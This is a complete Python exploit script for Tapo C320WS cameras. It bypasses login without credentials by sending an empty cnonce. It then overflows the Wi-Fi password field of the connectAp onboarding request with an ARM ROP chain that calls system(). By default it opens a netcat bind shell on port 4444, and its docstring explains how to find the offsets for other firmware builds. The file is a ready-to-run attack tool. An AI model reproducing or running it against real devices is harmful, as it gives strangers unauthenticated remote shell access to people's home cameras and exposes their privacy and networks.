#!/usr/bin/env python3
"""Send the connectAp ROP chain (pop -> system@plt -> pivot) to a Tapo camera.

The chain is address-free apart from three fixed `.text` addresses in a non-PIE
binary:

  saved pc -> `pop {r3..r11, pc}`      r3 = system@plt, pc = pivot
  pivot    -> `add r1, sp, #4; mov r0, sp; blx r3`   calls system(sp)
  sp       -> the NUL-terminated command

so no stack address is guessed. The three offsets are build-specific; the
C320WS 1.5.3/1.6.4 values are the defaults and must be re-derived from the
target's own `/bin/main` (same shape: find the `mbedtls_base64_decode` wrapper,
read its epilogue for the saved-pc offset, then find the three gadgets).

Usage:
  tapo_connectap_rop.py <host> [--cmd CMD] [--offset N] [--pop A] [--pivot A] [--system A]
                        [--ssid SSID] [--bssid MAC]

Default command starts a bind shell on :4444.
"""
import argparse
import base64
import json
import struct
import subprocess
import sys
import time

import hashlib

C320 = {"offset": 0x424, "pop": 0x00020004, "pivot": 0x000E1080, "system": 0x0001B468}


def payload(cmd: str, t: dict, prefix: bytes = b"") -> tuple[str, int]:
    cmd_b = cmd.encode() + b"\0"
    first = t["offset"] + 4
    command_at = first + 10 * 4
    buf = bytearray(b"A" * (command_at + len(cmd_b)))
    if prefix:
        # the handler hands the decrypted password to wpa_supplicant and only
        # reads to the first NUL: lead with the real PSK so the join succeeds
        # and only the process restarts instead of the radio.
        buf[0:len(prefix) + 1] = prefix + b"\0"
    buf[t["offset"]:t["offset"] + 4] = struct.pack("<I", t["pop"])
    chain = [t["system"]] + [0x41414141] * 8 + [t["pivot"]]
    for i, word in enumerate(chain):
        buf[first + i * 4:first + i * 4 + 4] = struct.pack("<I", word)
    buf[command_at:command_at + len(cmd_b)] = cmd_b
    return base64.b64encode(bytes(buf)).decode(), len(buf)


def post(host: str, path: str, body: dict, timeout: int = 8) -> str:
    r = subprocess.run(["curl", "-sk", "-m", str(timeout), "-H", "Content-Type: application/json",
                        "-H", "User-Agent: Tapo CameraClient Android", "-X", "POST",
                        "-d", json.dumps(body), "https://%s%s" % (host, path)],
                       capture_output=True, text=True)
    return r.stdout


def sha(s: str) -> str:
    return hashlib.sha256(s.encode()).hexdigest()


def login(host: str, tries: int = 60) -> dict:
    """Unauthenticated DS bypass: empty cnonce collapses the two digest orders."""
    for _ in range(tries):
        try:
            j = json.loads(post(host, "/", {"method": "login", "params": {
                "cnonce": "", "encrypt_type": "3", "username": "admin"}}, timeout=3))
        except Exception:
            time.sleep(2)
            continue
        d = (j.get("result") or {}).get("data") or {}
        if not d.get("device_confirm"):
            time.sleep(2)
            continue
        dc, nonce = d["device_confirm"], d["nonce"]
        try:
            j2 = json.loads(post(host, "/", {"method": "login", "params": {
                "cnonce": "", "encrypt_type": "3", "digest_passwd": dc, "username": "admin"}}, timeout=3))
        except Exception:
            time.sleep(2)
            continue
        if j2.get("error_code") == 0:
            return {"stok": j2["result"]["stok"], "seq": j2["result"]["start_seq"],
                    "lsk": sha("lsk" + nonce + dc[:64])[:32],
                    "ivb": sha("ivb" + nonce + dc[:64])[:32]}
        time.sleep(2)
    raise SystemExit("camera never woke")


def main() -> int:
    ap = argparse.ArgumentParser()
    ap.add_argument("host")
    ap.add_argument("--cmd", default="/bin/busybox nc -lk -p 4444 -e /bin/sh &")
    ap.add_argument("--offset", type=lambda x: int(x, 0), default=C320["offset"])
    ap.add_argument("--pop", type=lambda x: int(x, 0), default=C320["pop"])
    ap.add_argument("--pivot", type=lambda x: int(x, 0), default=C320["pivot"])
    ap.add_argument("--system", type=lambda x: int(x, 0), default=C320["system"])
    ap.add_argument("--prefix", default="", help="real Wi-Fi PSK to lead with")
    ap.add_argument("--ssid", default="Aardvark")
    ap.add_argument("--bssid", default="00:00:00:00:00:00")
    a = ap.parse_args()

    sess = login(a.host)
    print("stok ok")
    b64, n = payload(a.cmd, {"offset": a.offset, "pop": a.pop, "pivot": a.pivot,
                             "system": a.system}, a.prefix.encode())
    print("payload %d decoded bytes; cmd: %s" % (n, a.cmd))
    body = {"method": "connectAp", "params": {"onboarding": {"connect": {
        "ssid": a.ssid, "bssid": a.bssid, "auth": 1, "encryption": 3, "rssi": -50,
        "password": b64, "unique_key": 0, "band": 0}}}}
    t0 = time.time()
    try:
        out = post(a.host, "/stok=%s/ds" % sess["stok"], body, timeout=10)
        print("resp %dB in %.1fs: %s" % (len(out), time.time() - t0, out[:200]))
    except Exception as exc:
        print("conn dropped", exc)
    return 0


if __name__ == "__main__":
    sys.exit(main())
